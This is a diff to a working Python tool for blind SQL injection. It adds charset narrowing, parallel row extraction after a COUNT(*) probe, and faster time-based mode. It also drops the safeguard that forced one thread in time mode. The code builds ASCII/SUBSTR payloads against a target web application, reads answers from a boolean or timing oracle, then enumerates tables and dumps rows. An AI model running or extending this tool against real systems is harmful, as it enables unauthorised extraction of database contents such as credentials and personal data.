@@ -24,6 +24,21 @@ import requests
 CHARSET_LOW = 32    # space
 CHARSET_HIGH = 126  # '~'
 
+# Named charsets for --charset. Narrowing the search space cuts the number of
+# requests per character (binary search steps = ceil(log2(len))). Huge for time
+# mode: 'full' -> 7 steps, 'loweralnum' -> 6, 'hex' -> 4.
+import string as _string
+CHARSETS = {
+    "full": list(range(32, 127)),
+    "printable": list(range(32, 127)),
+    "alnum": sorted(ord(c) for c in _string.ascii_letters + _string.digits),
+    "loweralnum": sorted(ord(c) for c in _string.ascii_lowercase + _string.digits),
+    "lower": [ord(c) for c in _string.ascii_lowercase],
+    "upper": [ord(c) for c in _string.ascii_uppercase],
+    "digits": [ord(c) for c in _string.digits],
+    "hex": sorted(ord(c) for c in "0123456789abcdef"),
+}
+
 # Each worker thread gets its own requests.Session (thread-safe extraction).
 _tls = threading.local()
 
@@ -188,19 +203,19 @@ def wrap(args, cond):
     return cfg["time"].format(cond=cond, d=int(round(args.delay)), esc=esc)
 
 
-def char_cond(args, position, guess, cmp_op):
+def char_cond(args, position, guess, cmp_op, query):
     cfg = DBMS[args.dbms]
-    return (f"ASCII({cfg['substr']}(({args.query}),{position},1))"
+    return (f"ASCII({cfg['substr']}(({query}),{position},1))"
             f"{cmp_op}{guess}")
 
 
-def len_cond(args, guess, cmp_op):
+def len_cond(args, guess, cmp_op, query):
     cfg = DBMS[args.dbms]
-    return f"{cfg['length']}(({args.query})){cmp_op}{guess}"
+    return f"{cfg['length']}(({query})){cmp_op}{guess}"
 
 
-def build_payload(args, position, guess, cmp_op):
-    return wrap(args, char_cond(args, position, guess, cmp_op))
+def build_payload(args, position, guess, cmp_op, query):
+    return wrap(args, char_cond(args, position, guess, cmp_op, query))
 
 
 # --------------------------------------------------------------------------- #
@@ -409,68 +424,84 @@ def calibrate(args):
     print("[*] Oracle OK.\n")
 
 
-def find_length(args):
-    """Binary-search the length of the extracted value (0..--max-len)."""
+def find_length(args, query):
+    """Binary-search the length of the value (0..--max-len)."""
     lo, hi = 0, args.max_len
     while lo < hi:
         mid = (lo + hi) // 2
-        if is_true(args, wrap(args, len_cond(args, mid, ">"))):
+        if is_true(args, wrap(args, len_cond(args, mid, ">", query))):
             lo = mid + 1
         else:
             hi = mid
     return lo
 
 
-def find_char(args, position):
-    if not is_true(args, build_payload(args, position, 0, ">")):
-        return None  # past end of string
-    lo, hi = CHARSET_LOW, CHARSET_HIGH
+def find_char(args, position, query):
+    """Binary-search the character at `position` over the active charset."""
+    cs = args._charset                       # sorted list of ASCII codes
+    if not is_true(args, build_payload(args, position, cs[0] - 1, ">", query)):
+        return None  # no character here (past end of string)
+    lo, hi = 0, len(cs) - 1
     while lo < hi:
         mid = (lo + hi) // 2
-        if is_true(args, build_payload(args, position, mid, ">")):
+        if is_true(args, build_payload(args, position, cs[mid], ">", query)):
             lo = mid + 1
         else:
             hi = mid
-    return chr(lo)
+    return chr(cs[lo])
 
 
-def extract_scalar(args, label=""):
-    """Find length, then extract args.query char-by-char. Character positions
-    are searched in parallel across --threads workers. Returns the string."""
-    length = find_length(args)
-    if length == 0:
-        return ""
+def _extract_chars(args, query, length, on_progress=None):
+    """Extract `length` characters of `query` in parallel; returns the string."""
     total = min(length, args.max_len)
     chars = {}
-    start = time.time()
-
-    def render():
-        line = "".join(chars.get(p, "·") for p in range(1, total + 1))
-        done = len(chars)
-        sys.stdout.write(f"\r{label}[{done:>2}/{total}] {line}   "
-                         f"({time.time() - start:5.1f}s)")
-        sys.stdout.flush()
-
     workers = max(1, args.threads)
     if workers == 1:
         for pos in range(1, total + 1):
-            chars[pos] = find_char(args, pos)
-            render()
+            chars[pos] = find_char(args, pos, query)
+            if on_progress:
+                on_progress(chars)
     else:
         with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
-            futs = {ex.submit(find_char, args, pos): pos
+            futs = {ex.submit(find_char, args, pos, query): pos
                     for pos in range(1, total + 1)}
             for fut in concurrent.futures.as_completed(futs):
                 chars[futs[fut]] = fut.result()
-                render()
-    print()
-    # Assemble in order; stop at first missing char (shouldn't happen given len).
+                if on_progress:
+                    on_progress(chars)
     out = []
     for p in range(1, total + 1):
         if chars.get(p) is None:
             break
         out.append(chars[p])
     return "".join(out)
+
+
+def extract_value(args, query):
+    """Length + parallel char extraction, no live output. Returns the string."""
+    length = find_length(args, query)
+    if length == 0:
+        return ""
+    return _extract_chars(args, query, length)
+
+
+def extract_scalar(args, label=""):
+    """Extract args.query with a live per-character readout (single value)."""
+    length = find_length(args, args.query)
+    if length == 0:
+        return ""
+    total = min(length, args.max_len)
+    start = time.time()
+
+    def render(chars):
+        line = "".join(chars.get(p, "·") for p in range(1, total + 1))
+        sys.stdout.write(f"\r{label}[{len(chars):>2}/{total}] {line}   "
+                         f"({time.time() - start:5.1f}s)")
+        sys.stdout.flush()
+
+    val = _extract_chars(args, args.query, length, on_progress=render)
+    print()
+    return val
 
 
 # --------------------------------------------------------------------------- #
@@ -546,9 +577,8 @@ def resolve_auto(args):
                 thresh = args.delay * 0.8
                 args._oracle = (lambda r, e: e >= thresh)
                 args._resolved = True
-                if args.threads > 1:
-                    print(f"      (forcing --threads 1 for reliable time mode)")
-                    args.threads = 1
+                print(f"      (time mode is slow; --confirm re-checks positives. "
+                      f"Tip: --charset loweralnum/hex if you know the format)")
                 print(f"[+] Mode: time   DBMS: {engine}   "
                       f"Context: {name} (esc={esc!r})   Oracle: time >= "
                       f"{thresh:.1f}s\n")
@@ -698,11 +728,13 @@ def run_auto(args):
         if args.mode != "boolean":
             calibrate(args)
 
-    # 3. Version + current DB (nice-to-have context)
-    ver = extract_query(args, VERSION_QUERY[engine], label="version: ")
-    db = extract_query(args, DBNAME_QUERY[engine], label="database: ")
-    print(f"\n[+] Version : {ver}")
-    print(f"[+] Database: {db}\n")
+    # 3. Version + current DB — only with --info (these strings are long and
+    #    slow to extract, especially in time mode; skipped by default).
+    if args.info:
+        ver = extract_query(args, VERSION_QUERY[engine], label="version: ")
+        db = extract_query(args, DBNAME_QUERY[engine], label="database: ")
+        print(f"\n[+] Version : {ver}")
+        print(f"[+] Database: {db}\n")
 
     # 4. List tables
     print("[*] Listing tables...\n")
@@ -833,9 +865,15 @@ def main():
                         "all rows (uses --rows as the row cap, default 50)")
     p.add_argument("--sep", default="~",
                    help="Separator between concatenated columns (default '~')")
-    p.add_argument("--threads", type=int, default=5,
-                   help="Parallel workers for character search (default 5; "
-                        "use 1 for time-based to avoid queued-sleep false hits)")
+    p.add_argument("--threads", type=int, default=10,
+                   help="Parallel workers for character/row search (default 10)")
+    p.add_argument("--charset", default="full", choices=list(CHARSETS.keys()),
+                   help="Restrict the character set to speed up extraction: "
+                        "full (default), loweralnum, alnum, lower, upper, "
+                        "digits, hex. Fewer chars = fewer requests/char.")
+    p.add_argument("--info", action="store_true",
+                   help="In --auto, also extract DB version + name (slow, off "
+                        "by default — skips straight to tables)")
     p.add_argument("--timeout", type=float, default=15.0)
     p.add_argument("--proxy",
                    help="Proxy URL, e.g. http://127.0.0.1:8080 (route via Burp)")
@@ -884,6 +922,10 @@ def main():
 
     args._oracle = None
     args._resolved = False
+    # Active charset for extraction. Always include the column separator so a
+    # restricted charset (e.g. loweralnum) can't corrupt dumped rows.
+    _cs = set(CHARSETS[args.charset]) | {ord(c) for c in (args.sep or "")}
+    args._charset = sorted(_cs)
     _ESC_MAP = {"string": "'", "numeric": "", "double": '"'}
     args.esc = None if args.context == "auto" else _ESC_MAP[args.context]
 
@@ -893,9 +935,9 @@ def main():
         except Exception:
             pass
     if args.mode == "time" and args.threads > 1:
-        print("[!] time mode with --threads > 1 can cause false positives "
-              "(a FALSE request queued behind another thread's sleep looks "
-              "slow). Consider --threads 1.\n")
+        print("[*] time mode: --confirm re-checks positive results, so threading "
+              "is used for speed. If you see garbled chars, lower --threads or "
+              "raise --confirm/--delay.\n")
 
     src = f"req file {args.req}" if args.req else f"{args.method.upper()} {args.url}"
     print(f"[*] Source : {src}")
@@ -972,19 +1014,58 @@ def main():
         print(f"\n[+] Wrote {len(rows)} row(s) to {args.output}")
 
 
+def _row_count(args, base_query):
+    """Get COUNT(*) of base_query, or None if it can't be determined."""
+    cq = f"SELECT COUNT(*) FROM ({base_query}) sqli_cnt"
+    try:
+        s = extract_value(args, cq)
+        digits = "".join(ch for ch in s if ch.isdigit())
+        return int(digits) if digits else None
+    except Exception:
+        return None
+
+
 def collect_rows(args, base_query, n):
-    """Extract up to n rows of base_query via LIMIT/OFFSET; stop when empty."""
-    print(f"[*] Enumerating up to {n} row(s)...\n")
+    """Extract up to n rows of base_query. Counts rows first, then extracts them
+    all in parallel (across --threads). Falls back to sequential if COUNT fails."""
+    cnt = _row_count(args, base_query)
+
+    if cnt is not None:
+        total = min(cnt, n)
+        if total == 0:
+            print("[*] 0 rows.")
+            return []
+        print(f"[*] {cnt} row(s); extracting {total} in parallel...")
+        results = [None] * total
+        done = [0]
+
+        def one(i):
+            q = f"{base_query} {PAGE[args.dbms].format(i=i)}"
+            r = extract_value(args, q)
+            results[i] = r
+            done[0] += 1
+            sys.stdout.write(f"\r      rows {done[0]}/{total}")
+            sys.stdout.flush()
+            return r
+
+        workers = max(1, args.threads)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
+            list(ex.map(one, range(total)))
+        print()
+        return [r for r in results if r]
+
+    # Fallback: sequential, stop at first empty row.
+    print(f"[*] Enumerating up to {n} row(s) (sequential)...")
     found = []
-    saved = args.query
     for i in range(n):
-        args.query = f"{base_query} {PAGE[args.dbms].format(i=i)}"
-        val = extract_scalar(args, label=f"row {i}: ")
+        q = f"{base_query} {PAGE[args.dbms].format(i=i)}"
+        val = extract_value(args, q)
         if val == "":
-            print(f"[*] Row {i} empty — no more rows.")
             break
         found.append(val)
-    args.query = saved
+        sys.stdout.write(f"\r      rows {len(found)}")
+        sys.stdout.flush()
+    print()
     return found
 
 
